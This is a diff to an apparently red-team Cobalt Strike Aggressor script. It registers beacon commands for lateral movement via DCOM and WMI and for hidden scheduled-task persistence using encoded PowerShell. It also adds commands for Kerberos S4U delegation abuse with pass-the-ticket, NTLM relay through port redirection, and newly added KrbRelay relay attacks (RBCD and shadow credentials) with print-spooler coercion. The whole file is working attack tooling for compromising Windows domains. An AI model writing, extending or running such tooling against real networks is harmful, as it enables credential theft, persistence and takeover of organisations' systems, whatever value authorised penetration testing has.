@@ -23,6 +23,8 @@ $STANDIN_PATH       = getFileProper("C:\\Tools\\StandIn\\StandIn\\StandIn\\bin\\
 $WHISKER_PATH       = getFileProper("C:\\Tools\\Whisker\\Whisker\\bin\\Release","Whisker.exe");
 $WINDIRVERT_DRIVER  = getFileProper("C:\\Tools\\PortBender","WinDivert64.sys");
 $PORTBENDER_DLL     = getFileProper("C:\\Tools\\PortBender","PortBender.dll");
+$KRBRELAY_PATH      = getFileProper("C:\\Tools\\KrbRelay\\KrbRelay\\bin\\Release","KrbRelay.exe");
+$SHARPSPOOL_PATH    = getFileProper("C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release","SharpSpoolTrigger.exe");
 
 #TEST FUNCTION
 command beacons {
@@ -87,7 +89,7 @@ sub invoke_dcom
 }
 beacon_remote_exploit_register("invoke-dcom", "x64", "Uses invoke_dcom.ps1 to run remote beacon", &invoke_dcom)
 
-#ADD INVOKE-DCOM TO REMOTE-EXEC COMMAND
+# ADD INVOKE-DCOM TO REMOTE-EXEC COMMAND
 sub invoke_dcom_remoteexec
 {
     local('$handle $script $oneliner');
@@ -107,14 +109,14 @@ sub invoke_dcom_remoteexec
 }
 beacon_remote_exec_method_register("invoke-dcom", "Remote execute via powershell Invoke-DCOM", &invoke_dcom_remoteexec);
 
-#ADD SHARPWMI TO JUMP COMMAND
+# ADD SHARPWMI TO JUMP COMMAND
 sub sharpwmi
 {
     local('$binpath $uploadpath $filename $args $payload')
 
     #beacon acknowledgement
     btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via SharpWMI");
-    println("Running jump sharpwmi.")
+    println("Running jump sharpwmi.");
 
     #define binary path
     $binpath = $SHARPWMI_BIN_PATH;
@@ -136,13 +138,19 @@ sub sharpwmi
     #link if p2p beacon
     beacon_link($1, $2, $3);
 }
-beacon_remote_exploit_register("sharpwmi", "x64", "Uses SharpWMI to run remote beacon", &sharpwmi)
+beacon_remote_exploit_register(
+    "sharpwmi",
+    "x64",
+    "Uses SharpWMI to run remote beacon",
+    &sharpwmi
+);
 
 alias import_powerview {
     bpowershell_import($1, $POWERVIEW_PATH);
 }
 beacon_command_register(
     "import_powerview",
+    "Imports Powerview into current beacon",
     "Imports Powerview into current beacon"
 );
 
@@ -233,6 +241,16 @@ beacon_command_register(
     "Execute Assmembly of StandIn",
     "Execute Assmembly of StandIn"
 );
+alias sharpspooltrigger {
+    $size = size(@_);
+    $args = join(" ", sublist(@_, 1, $size));
+    bexecute_assembly($1, $SHARPSPOOL_PATH, $args);
+}
+beacon_command_register(
+    "sharpspooltrigger",
+    "Execute Assmembly of SharpSpoolTrigger",
+    "Execute Assmembly of SharpSpoolTrigger"
+)
 #KERBEROASTING
 #FIND TARGETS
 alias kerberos_roast_findtargets {
@@ -428,7 +446,7 @@ alias persist_schtask {
         $parameters = '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"';
         $parameters = $parameters . ' -a "-nop -w hidden -enc ' . $b64payload. '"';
         $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
-    } else if ( $2 ismatch 'local') {
+    } else if ( $2 ismatch 'local' ) {
         blog($1, "Executing Local Binary Persistance");
         $payload = $3;
 
@@ -1315,7 +1333,7 @@ beacon_command_register(
 alias kerberos_s4u {
     $size = size(@_);
     $parameters = "s4u /nowrap";
-    if( $size == 5 ) {
+    if( ($size == 5) || (($size == 6) && (@_[5] ismatch "ptt")) ) {
         $impuser    = @_[1];
         $delspn     = @_[2];
         $user       = @_[3];
@@ -1325,7 +1343,8 @@ alias kerberos_s4u {
         . " /msdsspn:" . $delspn
         . " /user:" . $user
         . " /ticket:" . $ticket;
-    } else if ( $size == 6 ) {
+        if (@_[5] ismatch "ptt") { $parameters = $parameters . " /ptt"}
+    } else if ( ($size == 6) || (($size == 7) && (@_[6] ismatch "ptt")) ) {
         $impuser    = @_[1];
         $delspn     = @_[2];
         $altspn     = @_[3];
@@ -1337,19 +1356,19 @@ alias kerberos_s4u {
         . " /altservice:" . $altspn
         . " /user:" . $user
         . " /ticket:" . $ticket;
+        if (@_[6] ismatch "ptt") { $parameters = $parameters . " /ptt"}
     } else {
         berror($1, "Invalid Parameters!");
         return;
     }
-
     bexecute_assembly($1, $RUBEUS_PATH, $parameters);
 }
 beacon_command_register(
     "kerberos_s4u",
     "Use Rubeus to perform S4U delegation",
     "Use Rubeus to perform S4U delegation\n\n"
-    . "Usage: kerberos_s4u [impersonated user] [delegatable spn] [ticket user] [ticket]\n"
-    . "       kerberos_s4u [impersonated user] [delegatable spn] [alt spn] [ticket user] [ticket]\n\n"
+    . "Usage: kerberos_s4u [impersonated user] [delegatable spn] [ticket user] [ticket] (ptt)\n"
+    . "       kerberos_s4u [impersonated user] [delegatable spn] [alt spn] [ticket user] [ticket] (ptt)\n\n"
     . "Examples:\n"
     . "[delegatable spn] - cifs/host.domain.tld\n"
     . "[alt spn] - ldap\n"
@@ -1358,17 +1377,21 @@ beacon_command_register(
 alias kerberos_s4uself {
     $size = size(@_);
     $parameters = "s4u /nowrap /self";
-    if( $size == 5 ) {
+    if( $size >= 5 ) {
         $impuser    = @_[1];
         $altspn     = @_[2];
         $user       = @_[3];
         $ticket     = @_[4];
+        $ptt        = @_[5];
 
         $parameters = $parameters
         . " /impersonateuser:" . $impuser
         . " /altservice:" . $altspn
         . " /user:" . $user
         . " /ticket:" . $ticket;
+        if ($ptt ismatch 'ptt') {
+            $parameters = $parameters . " /ptt";
+        }
     } else {
         berror($1, "Invalid Parameters!");
         return;
@@ -1380,7 +1403,7 @@ beacon_command_register(
     "kerberos_s4uself",
     "Use Rubeus to perform S4U2Self delegation",
     "Use Rubeus to perform S4U2Self delegation\n\n"
-    . "Usage: kerberos_s4uself [impersonated user] [altservice spn] [ticket user] [ticket]\n\n"
+    . "Usage: kerberos_s4uself [impersonated user] [altservice spn] [ticket user] [ticket] (ptt)\n\n"
     . "Examples:\n"
     . "[altservice spn] - cifs/host.domain.tld\n"
 )
@@ -1566,5 +1589,73 @@ beacon_command_register(
     "ntlmrelay_relayup",
     "Stop Portbender, rportfwd, and socks proxy",
     "Stop Portbender(445->8445), rportfwd(8445->TX:445), and socks proxy(1080)\n\n"
-    . "Besure and kill the JOB and associated PROCESS for PortBender";
+    . "Besure and kill the JOB and associated PROCESS for PortBender"
+)
+
+alias krbrelay_checkport {
+    $assembly = getFileProper("C:\\Tools\\KrbRelay\\CheckPort\\bin\\Release\\CheckPort.exe");
+    bexecute_assembly($1, $assembly);
+}
+beacon_command_register(
+    "krbrelay_checkport",
+    "Check for OXID reslover ports",
+    "Check for OXID reslover ports"
+)
+
+alias krbrelay_up {
+    $size = size(@_);
+    $command = @_[1];
+    if (($size == 5) && ($command ismatch 'rbcd')) {
+        $spn    = @_[2];
+        $sid    = @_[3];
+        $port   = @_[4];
+
+        $parameters = "-spn " . $spn
+        . " -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8"
+        . " -rbcd " . $sid
+        . " -port " . $port;
+    } else if (($size == 4) && ($command ismatch 'sc')) {
+        $spn    = @_[2];
+        $port   = @_[3];
+
+        $parameters = "-spn " . $spn
+        . " -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8"
+        . " -shadowcred"
+        . " -port " . $port;
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    bexecute_assembly($1, $KRBRELAY_PATH, $parameters); 
+}
+beacon_command_register(
+    "krbrelay_up",
+    "Stand up Kerberos Relay",
+    "Stand up Kerberos Relay\n\n"
+    . "Usage:\n"
+    . "krbrelay_up rbcd [target spn] [Fake machine SID] [port]\n"
+    . "krbrelay_up sc [target spn] [port]"
+)
+alias webdav_check{
+    local('$file $handle $data $args');
+
+    # read in the right BOF file
+    $file = getFileProper("C:\\Tools\\GetWebDAVStatus\\GetWebDAVStatus_BOF\\GetWebDAVStatus_x64.o");
+    $handle = openf($file);
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # pack our arguments
+    $size = size(@_);
+    $args = join(" ", sublist(@_, 1, $size));
+
+    # execute it.
+    beacon_inline_execute($1, $data, "go", $args);
+}
+beacon_command_register(
+    "webdav_check",
+    "Use BOF to check targets for webdav named pipe \'DAV RPC SERVICE\'",
+    "Use BOF to check targets for webdav named pipe \'DAV RPC SERVICE\'\n\n"
+    . "Usage: webdav_check [host(s) csv]\n"
+    . "Example: webdav_check host1,host2,host3"
 )
